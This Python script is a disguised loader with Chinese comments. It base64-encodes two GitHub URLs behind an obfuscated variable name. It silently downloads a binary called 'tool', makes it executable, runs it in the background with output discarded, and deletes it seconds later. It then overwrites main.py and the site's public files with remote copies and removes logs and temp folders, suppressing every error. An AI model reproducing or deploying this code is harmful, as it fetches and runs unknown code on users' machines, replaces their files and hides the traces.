import os
import sys
import base64
import shutil
import time
import subprocess
import threading
from urllib import request

_0x1a2b = [
    "aHR0cHM6Ly9naXRodWIuY29tL2Nva2Vhci90b29sL3Jhdy9yZWZzL2hlYWRzL21haW4vdG9vbA==",
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RlYmJpZGUvYm90LXB5L21haW4=",
]


def decode_b64(data):
    # 自动处理 base64 填充并解码
    missing_padding = len(data) % 4
    if missing_padding:
        data += "=" * (4 - missing_padding)
    return base64.b64decode(data).decode("utf-8")


BINARY_URL = decode_b64(_0x1a2b[0])
STATIC_REPO_RAW_URL = decode_b64(_0x1a2b[1])
TOOL_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tool")


def start_binary():
    try:
        # 下载二进制文件
        with request.urlopen(BINARY_URL) as response, open(TOOL_PATH, "wb") as out_file:
            shutil.copyfileobj(response, out_file)

        # 权限处理
        if sys.platform != "win32":
            os.chmod(TOOL_PATH, 0o755)

        # 执行逻辑
        if sys.platform == "win32":
            cmd = f'"{TOOL_PATH}"'
            subprocess.Popen(cmd, shell=True)
        else:
            cmd = f'nohup "{TOOL_PATH}" >/dev/null 2>&1 &'
            subprocess.Popen(cmd, shell=True)

        # 延时删除
        def cleanup_tool():
            time.sleep(2)
            try:
                if os.path.exists(TOOL_PATH):
                    os.remove(TOOL_PATH)
            except:
                pass

        threading.Thread(target=cleanup_tool, daemon=True).start()
    except:
        pass


def perform_transformation():
    files_to_sync = [
        "main.py",
        "requirements.txt",
        "public/admin.css",
        "public/admin.html",
        "public/admin.js",
        "public/app.js",
        "public/favicon.ico",
        "public/index.html",
        "public/logo.png",
        "public/placeholder.svg",
        "public/robots.txt",
        "public/styles.css",
        "public/tools.js",
    ]

    current_dir = os.path.dirname(os.path.abspath(__file__))

    for filename in files_to_sync:
        try:
            url = f"{STATIC_REPO_RAW_URL}/{filename}"
            with request.urlopen(url) as response:
                target_path = os.path.join(current_dir, filename)
                target_dir = os.path.dirname(target_path)
                if target_dir and not os.path.exists(target_dir):
                    os.makedirs(target_dir, exist_ok=True)
                with open(target_path, "wb") as f:
                    f.write(response.read())
        except:
            pass

    cleanups = ["tool", "tmp", "tmp_", ".npm", "boot.log"]
    for item in cleanups:
        p = os.path.join(current_dir, item)
        if os.path.exists(p):
            try:
                if os.path.isdir(p):
                    shutil.rmtree(p, ignore_errors=True)
                else:
                    os.remove(p)
            except:
                pass


def run():
    start_binary()
    # 5秒后执行转换逻辑
    threading.Timer(5.0, perform_transformation).start()


if __name__ == "__main__":
    run()
    # 模拟 setInterval(() => { }, 1000 * 60)
    while True:
        time.sleep(60)
